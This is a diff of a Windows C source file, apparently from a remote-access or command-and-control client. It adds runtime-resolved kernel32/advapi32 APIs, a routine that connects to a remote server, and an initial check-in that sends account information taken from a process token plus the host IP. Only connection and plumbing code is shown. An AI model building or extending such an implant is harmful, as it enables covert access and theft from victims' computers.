@@ -1,7 +1,9 @@
 #include <WinSock2.h>
 #include <stdio.h>
-#include <	ws2tcpip.h>
+#include <ws2tcpip.h>	// inet_pton
+#include <iphlpapi.h>   // IPAddr
 
+#include "LoadAPI.h"
 #include "CheckSystem.h"
 #include "SocketTools.h"
 #include "Message.h"
@@ -24,10 +26,10 @@ BOOL GetIpAddress(SOCKET mysocket,char* ipAddress) {
 }
 
 // hToken
-BOOL SendInitInfo(SOCKET mysocket, HANDLE hToken) {
+BOOL SendInitInfo(Kernel32_API kernel32, Advapi32_API advapi32, SOCKET mysocket, HANDLE hToken) {
 	AccountInformation* accountInformation = NULL;
 
-	if (GetAccountInformation(hToken, &accountInformation) && accountInformation != NULL) {
+	if (GetAccountInformation(kernel32, advapi32,hToken, &accountInformation) && accountInformation != NULL) {
 		char* sendBuffer = (char*)malloc(BUF_SIZE);
 		if (sendBuffer != NULL) {
 			char* ipAddress = (char*)malloc(IP_ADDRESS_SIZE);
@@ -47,6 +49,34 @@ BOOL SendInitInfo(SOCKET mysocket, HANDLE hToken) {
 		}
 		free(accountInformation);
 	}
+	return FALSE;
+}
+
+SOCKADDR_IN InitSockAddr(char* ipAddress, int port) {
+	SOCKADDR_IN ssin;
+	IPAddr ipAddressF;
+
+	if (inet_pton(AF_INET, ipAddress, &ipAddressF)) {
+		memset(&ssin, 0, sizeof(SOCKADDR_IN));
+		ssin.sin_family = AF_INET;
+		ssin.sin_addr.s_addr = ipAddressF;
+		ssin.sin_port = htons(port);
+	}
+	return ssin;
+}
+SOCKET ConnectRemoteServer(char* ipAddress, int port) {
+	SOCKADDR_IN sAddr;
+	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+
+	if (clientSocket == INVALID_SOCKET) {
+		printf("[x] Could not create socket : %d", WSAGetLastError());
+		return FALSE;
+	}
+	sAddr = InitSockAddr(ipAddress, port);
+
+	if (connect(clientSocket, (struct sockaddr*)&sAddr, sizeof(sAddr)) != SOCKET_ERROR)
+		return clientSocket;
+	closesocket(clientSocket);
 	return FALSE;
 }
 /*
